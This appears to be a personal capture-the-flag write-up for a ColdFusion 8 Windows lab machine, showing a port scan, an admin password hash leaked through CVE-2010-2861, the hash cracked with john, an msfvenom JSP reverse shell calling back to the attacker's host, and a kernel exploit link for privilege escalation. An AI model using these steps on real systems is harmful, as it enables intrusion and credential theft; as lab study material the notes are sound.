
```
kali@kali ~> nmap -sC -sV -Pn 10.10.10.11
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-18 03:38 EDT
Nmap scan report for 10.10.10.11
Host is up (0.062s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 154.40 seconds

```



https://www.drchaos.com/post/a-walk-down-adversary-lane-coldfusion-v8

https://www.cvedetails.com/cve/CVE-2010-2861/

https://nets.ec/Coldfusion_hacking



https://github.com/chaitin/xray/blob/master/pocs/coldfusion-cve-2010-2861-lfi.yml


```

<html>

<head>

	<LINK REL="SHORTCUT ICON" href="http://10.10.10.11:8500/CFIDE/administrator/favicon.ico">

	<title>#Wed Mar 22 20:53:51 EET 2017

rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n

password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03

encrypted=true</title>





	

	

<style>
body, p, td {
	font-family: Arial, Helvetica, sans-serif;
	font-size: small;
```



```
kali@kali ~> john hash.txt -w=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-AxCrypt"
Use the "--format=Raw-SHA1-AxCrypt" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-Linkedin"
Use the "--format=Raw-SHA1-Linkedin" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "ripemd-160"
Use the "--format=ripemd-160" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 128/128 AVX 4x])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
happyday         (?)
1g 0:00:00:00 DONE (2024-07-17 10:59) 10.00g/s 51160p/s 51160c/s 51160C/s jodie..gabita
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed.
```

![[Notes-20240718123038570.webp]]


```
kali@kali ~> msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.30 LPORT=4444 > test.jsp
Payload size: 1497 bytes
kali@kali ~> python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

so basically what happens in this scheduled task is that it access's the URL and then saves it so we visit that file and where it is saved and boom we are able to get a shell


https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059


so to exploit it


---
# Mistakes

- Didnt fully read the exploit
- didnt fully check everyport and quit early
- privesc wasnt my fault lol